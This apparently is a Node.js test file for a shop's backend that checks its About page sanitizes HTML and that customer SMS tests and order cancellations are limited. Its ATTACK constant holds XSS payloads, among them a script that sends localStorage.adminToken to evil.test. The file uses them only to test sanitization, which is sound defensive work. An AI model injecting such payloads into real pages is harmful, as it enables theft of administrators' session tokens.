const { describe, it, before, after, beforeEach } = require('node:test');
const assert = require('node:assert/strict');
const request = require('supertest');
const {
  startDatabase, stopDatabase, clearDatabase, createApp, adminToken, registerCustomer, createProduct, orderPayload
} = require('./helpers');

const ATTACK = '<h2 onclick="steal()">Qui sommes-nous ?</h2>'
  + '<script>fetch("https://evil.test/?t=" + localStorage.adminToken)</script>'
  + '<img src="x" onerror="steal()">'
  + '<a href="javascript:steal()">lien</a>'
  + '<iframe src="https://evil.test"></iframe>'
  + '<p>Texte <strong>gras</strong> et <a href="https://stes.tn" target="_blank">site</a></p>';

const assertHarmless = (html) => {
  for (const bad of ['<script', 'onerror', 'onclick', 'javascript:', '<iframe', 'evil.test']) {
    assert.ok(!html.includes(bad), `${bad} should be removed from ${html}`);
  }
  assert.ok(html.includes('<h2>Qui sommes-nous ?</h2>'));
  assert.ok(html.includes('<strong>gras</strong>'));
  assert.ok(html.includes('href="https://stes.tn"'));
  assert.ok(html.includes('rel="noopener noreferrer"'));
};

describe('About and Contact page content', () => {
  let app;
  let admin;
  let Page;

  before(async () => {
    await startDatabase();
    Page = require('../models/Page');
  });
  after(stopDatabase);
  beforeEach(async () => {
    await clearDatabase();
    app = createApp();
    admin = await adminToken(app);
    await request(app).post('/api/pages/initialize').set('Authorization', `Bearer ${admin}`).expect(200);
  });

  const save = (body) => request(app).put('/api/pages/about').set('Authorization', `Bearer ${admin}`)
    .send({ title: 'À propos', ...body });

  it('removes scripts, event handlers and javascript: links when saving, and keeps the formatting', async () => {
    const res = await save({ content: ATTACK, contentEn: ATTACK }).expect(200);
    assertHarmless(res.body.content);
    assertHarmless(res.body.contentEn);

    const stored = await Page.findOne({ slug: 'about' }).lean();
    assertHarmless(stored.content);
  });

  it('cleans content saved before, when the shop reads it', async () => {
    await Page.updateOne({ slug: 'about' }, { $set: { content: ATTACK } });

    const one = (await request(app).get('/api/pages/about').expect(200)).body;
    assertHarmless(one.content);
    const all = (await request(app).get('/api/pages').expect(200)).body;
    assertHarmless(all.find(page => page.slug === 'about').content);
    assert.equal(one.lastModifiedBy, undefined);
  });

  it('keeps the page at its address', async () => {
    await save({ content: '<p>Nouveau</p>', slug: 'autre' }).expect(200);
    assert.ok(await Page.exists({ slug: 'about' }));
    assert.equal(await Page.exists({ slug: 'autre' }), null);
  });
});

describe('customer account limits', () => {
  let app;
  let token;

  before(startDatabase);
  after(stopDatabase);
  beforeEach(async () => {
    await clearDatabase();
    app = createApp();
    ({ token } = await registerCustomer(app));
  });

  const as = (method, path) => request(app)[method](path).set('Authorization', `Bearer ${token}`);

  it('allows 3 notification tests an hour, since each can send a paid SMS', async () => {
    for (let i = 0; i < 3; i++) {
      const res = await as('post', '/api/notifications/test');
      assert.notEqual(res.status, 429);
    }
    const blocked = await as('post', '/api/notifications/test').expect(429);
    assert.match(blocked.body.message, /Trop de tests/);
  });

  it('checks the order id and the length of a cancellation reason', async () => {
    const product = await createProduct();
    const { id } = (await as('post', '/api/orders')
      .send(orderPayload([{ productId: product._id, quantity: 1 }])).expect(201)).body.order;

    await as('post', '/api/customer-orders/not-an-id/cancel').send({}).expect(400);
    await as('post', `/api/customer-orders/${id}/cancel`).send({ reason: 'x'.repeat(501) }).expect(400);
    await as('post', `/api/customer-orders/${id}/cancel`).send({ reason: 'Commandé par erreur' }).expect(200);
  });
});
